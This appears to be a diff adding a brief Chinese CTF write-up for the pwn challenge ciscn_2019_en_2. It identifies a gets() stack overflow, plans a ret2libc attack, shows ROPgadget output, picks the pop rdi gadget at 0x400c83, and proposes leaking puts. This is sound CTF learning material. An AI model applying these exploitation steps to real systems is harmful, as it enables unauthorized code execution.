@@ -1,0 +1,22 @@
+只开了NX，IDA打开看到只有一个encrypt函数能用的，gets(s)栈溢出，没找到后门函数，那就考虑ret2libc
+ROPgadget --binary ciscn_2019_en_2 --only "pop|ret"
+            user@user-virtual-machine:~$ ROPgadget --binary ciscn_2019_en_2 --only "pop|ret"
+            Gadgets information
+            ============================================================
+            0x0000000000400c7c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
+            0x0000000000400c7e : pop r13 ; pop r14 ; pop r15 ; ret
+            0x0000000000400c80 : pop r14 ; pop r15 ; ret
+            0x0000000000400c82 : pop r15 ; ret
+            0x0000000000400c7b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
+            0x0000000000400c7f : pop rbp ; pop r14 ; pop r15 ; ret
+            0x00000000004007f0 : pop rbp ; ret
+            0x0000000000400aec : pop rbx ; pop rbp ; ret
+            0x0000000000400c83 : pop rdi ; ret
+            0x0000000000400c81 : pop rsi ; pop r15 ; ret
+            0x0000000000400c7d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
+            0x00000000004006b9 : ret
+            0x00000000004008ca : ret 0x2017
+            0x0000000000400962 : ret 0x458b
+            0x00000000004009c5 : ret 0xbf02
+400C83那里有一个可用的
+然后泄露一下puts地址，后面就是垃圾时间了
